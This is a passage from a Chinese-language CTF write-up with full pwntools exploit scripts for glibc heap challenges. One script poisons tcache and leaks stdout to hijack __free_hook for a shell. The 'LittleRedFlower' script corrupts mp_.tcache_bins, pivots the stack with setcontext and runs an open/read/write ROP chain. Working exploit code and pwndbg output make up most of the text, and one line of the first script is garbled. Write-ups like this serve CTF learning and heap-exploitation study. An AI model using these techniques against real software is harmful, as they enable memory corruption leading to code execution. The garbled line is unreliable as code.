    while True:
        try:
            add(0x78)
            delete()
            show()
            heap_base = u64(p.recv(8)) > 12) ^ (heap_base + 0x10)
            edit(p64(enc) + p64(heap_base + 0x10))
            add(0x78)
            add(0x78, b"\x00"*0x48 + p64(0x0007000000000000))
            gdb.attach(p, "b *$rebase(0xE23)")
            delete()
            # gdb.attach(p, "b *$rebase(0xE23)")
            add(0x48, p16(0)*2 + p16(2) + p16(0) + p16(1) + p16(0) + p32(0) + b"\x00"*0x38)
            add(0x48, b"\x00"*0x40 + p64(heap_base + 0xb0))
            delete()
            add(0x38, p16(stdout))
            add(0x58, p64(0xfdad2887 | 0x1000) + p64(0)*3 + b"\x00")
            libc.address = u64(p.recv(8)) - 0x84 - libc.sym['_IO_2_1_stdout_']
            log.success("libc address is {}".format(hex(libc.address)))
            break
        except:
            p.close()
            p = remote('node3.buuoj.cn', 26212)
    add(0x48, b"\x00"*0x40 + p64(libc.sym['__free_hook'] - 0x10))
    add(0x38, b"/bin/sh\x00".ljust(0x10) + p64(libc.sym['system']))
    delete()
    p.interactive()
## LittleRedFlower
###  分析
首先用`ida`看一下。程序在一开始给出了一个`libc`地址。接着提供了一个一字节的任意写和一个`8`字节的任意写，然后根据用户输入的`size`分配了对应大小的堆块，注意的是这里的堆块大小需要满足`>
0x1000 & counts[tc_idx] > 0)
        {
          return tcache_get (tc_idx);
        }
      DIAG_POP_NEEDS_COMMENT;
这里需要满足三个条件才可以进行`tcache_get`的调用，我们来看一下`tcache_bins`，该成员变量限制了可以放入`tcache`的堆块大小与`global_max_fast`类似。
    pwndbg> p mp_
    $1 = {
      trim_threshold = 131072,
      top_pad = 131072,
      mmap_threshold = 131072,
      arena_test = 8,
      arena_max = 0,
      n_mmaps = 0,
      n_mmaps_max = 65536,
      max_n_mmaps = 0,
      no_dyn_threshold = 0,
      mmapped_mem = 0,
      max_mmapped_mem = 0,
      sbrk_base = 0x555555757000 "",
      tcache_bins = 64,
      tcache_max_bytes = 1032,
      tcache_count = 7,
      tcache_unsorted_limit = 0
    }
    pwndbg> p &mp_
    $2 = (struct malloc_par *) 0x7ffff7fbb280 
    pwndbg> x/20gx 0x7ffff7fbb280
    0x7ffff7fbb280 :   0x0000000000020000      0x0000000000020000
    0x7ffff7fbb290 :        0x0000000000020000      0x0000000000000008
    0x7ffff7fbb2a0 :        0x0000000000000000      0x0001000000000000
    0x7ffff7fbb2b0 :        0x0000000000000000      0x0000000000000000
    0x7ffff7fbb2c0 :        0x0000000000000000      0x0000555555757000
    0x7ffff7fbb2d0 :        0x0000000000000040      0x0000000000000408
    0x7ffff7fbb2e0 :        0x0000000000000007      0x0000000000000000
    0x7ffff7fbb2f0 :  0x0000000000000001      0x0000000001000000
    0x7ffff7fbb300 :      0x0000000000800000      0x0000000001000000
    0x7ffff7fbb310 :  0x0000000000800000      0x0000000000008000
这里的`tcache_bins`默认是`0x40`，也就是`tcache`中堆块最大为`0x410`大小，如果我们将此成员变量改大，那么在之后我们分配`>0x1000`的堆块的时候就可以从`tcache`中进行分配了。
但是这里涉及到一个`count`和`entry`的问题。首先来看`count`，由于之前没有堆块的释放，因此整个`pthread_tcache_struct`全部为`0`，只能看程序一开始的`0x200`堆块，因为该堆块全部被`memset`为了`\x01`，这里正好可以作为`tcache`的`count`。
那么利用之后的`8`字节任意写在对应的位置写入`free_hook`的值就可以直接分配到`free_hook`了。这里我选择的大小为`0x1510`。
到此可以覆写`free_hook`了，但是程序开启了沙箱，只能利用`setcontext`进行一下迁移栈地址了，我是将栈地址迁移到了`free_hook`附近，并在此处布置了`orw
rop`。这里的详细内容可以看一下SROP。
###  EXP
    # encoding=utf-8
    from pwn import *
    file_path = "./pwn"
    context.arch = "amd64"
    context.log_level = "debug"
    context.terminal = ['tmux', 'splitw', '-h']
    elf = ELF(file_path)
    debug = 1
    if debug:
        p = process([file_path])
        gdb.attach(p, "b *$rebase(0xc60)\nb *$rebase(0xF2a)\n b malloc\nb free")
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        one_gadget = [0xe6b93, 0xe6b96, 0xe6b99, 0x10af39]
    else:
        p = remote('node3.buuoj.cn', 29649)
        libc = ELF('./libc.so.6')
        one_gadget = [0xe6b93, 0xe6b96, 0xe6b99, 0x10af39]
    p.recvuntil("GIFT: ")
    libc.address = int(p.recvline().strip(), 16) - libc.sym['_IO_2_1_stdout_']
    log.success("libc address is {}".format(hex(libc.address)))
    mp_address = libc.sym['obstack_exit_failure'] - 0x70
    p.sendafter("byte anywhere\n", p64(mp_address + 0x51))
    p.sendafter("what?", "\x02")
    p_rsi_r = 0x000000000002709c + libc.address
    p_rdi_r = 0x0000000000026bb2 + libc.address
    p_rdx_r12_r = 0x000000000011c3b1 + libc.address
    p_rax_r = 0x0000000000028ff4 + libc.address
    syscall = 0x0000000000066199 + libc.address
    leave_r = 0x000000000005a9a8 + libc.address
    ret = 0x00000000000bffbb + libc.address
    flag_str_address = libc.sym['__free_hook'] + 0x28
    flag_address = libc.sym['__free_hook'] + 0x30
    setcontext = libc.sym['setcontext'] + 61
    frame_address = libc.sym['__free_hook']
    orw_address = libc.sym['__free_hook'] + 0xb0
    magic_gadget = 0x0000000000154b20 + libc.address
    orw = flat([
        p_rdi_r, flag_str_address,
        p_rsi_r, 0,
        p_rax_r, 2,
        syscall,
        p_rdi_r, 3,
        p_rsi_r, flag_address,
        p_rdx_r12_r, 0x30, 0,
        p_rax_r, 0,
        syscall,
        p_rdi_r, 1,
        p_rsi_r, flag_address,
        p_rdx_r12_r, 0x30, 0,
        p_rax_r, 1,
        syscall
    ])
    log.success("mp_ address is {}".format(hex(mp_address)))
    p.sendlineafter("Offset:\n", str(0x868))
    p.sendafter("Content:\n", p64(libc.sym['__free_hook']))
    p.sendlineafter("size:\n", str(0x1500))
    payload = p64(magic_gadget) + p64(frame_address)
    payload += p64(0)*2 + p64(setcontext) + b"flag\x00".ljust(8, b"\x00")
    payload += b"\x00"*0x70 + p64(orw_address) + p64(ret)
    payload += orw
    p.sendlineafter(">>", payload)
    p.interactive()